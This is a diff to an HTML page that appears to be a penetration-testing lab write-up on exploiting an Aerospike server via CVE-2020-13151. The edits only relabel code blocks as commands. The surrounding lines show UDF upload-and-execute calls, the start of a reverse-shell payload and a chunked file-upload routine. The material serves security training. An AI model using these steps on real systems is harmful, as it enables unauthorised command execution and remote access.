@@ -636,7 +636,7 @@ heartbeat protocol refusing a text packet, exactly as chapter 01 observed.</p>
 <p>Aerospike ships an <code>asinfo</code> tool that speaks the info protocol, but it is not installed on the
 attacker box and the info port is filtered anyway. The clean way to confirm the product is to speak
 the <em>client</em> protocol to 3000, which is open:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="ch">#!/usr/bin/env python3</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="ch">#!/usr/bin/env python3</span>
 <span class="sd">"""Fingerprint the Aerospike node on 192.168.150.143:3000."""</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">aerospike</span>
@@ -707,7 +707,7 @@ missed on an exam: <strong>a tool's version gate is not evidence.</strong> The e
 (<code>5.1.0.1</code>), the advisory's fixed version (<code>5.1.0.3</code>), and a successful <code>apply()</code>. Two of those
 three can be read off the box; the third is one call away.</p>
 <p>The fix is not to patch the exploit. It is to use the client library directly, which is four calls:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">client</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">{</span><span class="s2">"pk"</span><span class="p">:</span> <span class="s2">"x"</span><span class="p">})</span>                       <span class="c1"># a record to attach the UDF to</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">client</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">{</span><span class="s2">"pk"</span><span class="p">:</span> <span class="s2">"x"</span><span class="p">})</span>                       <span class="c1"># a record to attach the UDF to</span>
 <span class="n">client</span><span class="o">.</span><span class="n">udf_put</span><span class="p">(</span><span class="s2">"/tmp/aero_poc/poc.lua"</span><span class="p">)</span>            <span class="c1"># upload the module</span>
 <span class="n">client</span><span class="o">.</span><span class="n">apply</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s2">"poc"</span><span class="p">,</span> <span class="s2">"runCMD"</span><span class="p">,</span> <span class="p">[</span><span class="s2">"id"</span><span class="p">])</span>         <span class="c1"># run it</span>
 </pre></div>
@@ -774,7 +774,7 @@ connection that sent it. No listener, no callback, no port forward.</p>
 <h3>4.2 Driving the client</h3>
 <p>The published exploit refuses this version (chapter 03, §3.3), so the client library is driven
 directly. The full script is in <a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/poc_aerospike_rce.py"><code>scripts/poc_aerospike_rce.py</code></a>:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="ch">#!/usr/bin/env python3</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="ch">#!/usr/bin/env python3</span>
 <span class="sd">"""CVE-2020-13151 — Aerospike CE &lt; 5.1.0.3 unauthenticated command execution."""</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span><span class="o">,</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">random</span><span class="o">,</span><span class="w"> </span><span class="nn">string</span><span class="o">,</span><span class="w"> </span><span class="nn">sys</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">aerospike</span>
@@ -943,7 +943,7 @@ aero</span></pre></div>
 what you are missing: no <code>sudo</code> prompt, no <code>su</code>, no <code>ssh</code> password entry, no <code>top</code> or <code>less</code> without
 <code>TERM</code>. For a real PTY, spawn one from the target's own Python. Full payload in
 <a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/revshell.py"><code>scripts/revshell.py</code></a>:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="ch">#!/usr/bin/env python3</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="ch">#!/usr/bin/env python3</span>
 <span class="sd">"""Connect back and hand the socket to a pty — a terminal, not a pipe."""</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
 <span class="kn">import</span><span class="w"> </span><span class="nn">pty</span>
@@ -1023,7 +1023,7 @@ the only path when no allowlisted port happens to be free.</p>
 each <code>apply()</code> blocks a server thread. The compromise is <strong>chunked base64 appended to a temp file</strong>,
 with a small chunk size so no single call outlives the client timeout. The script is
 <a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.150.143-aerospike-screen/scripts/poc_aerospike_upload.py"><code>scripts/poc_aerospike_upload.py</code></a>:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">CHUNK</span> <span class="o">=</span> <span class="mi">3000</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="n">CHUNK</span> <span class="o">=</span> <span class="mi">3000</span>
 <span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">local</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
 
 <span class="n">run</span><span class="p">(</span><span class="sa">f</span><span class="s2">"rm -f </span><span class="si">{</span><span class="n">tmp</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
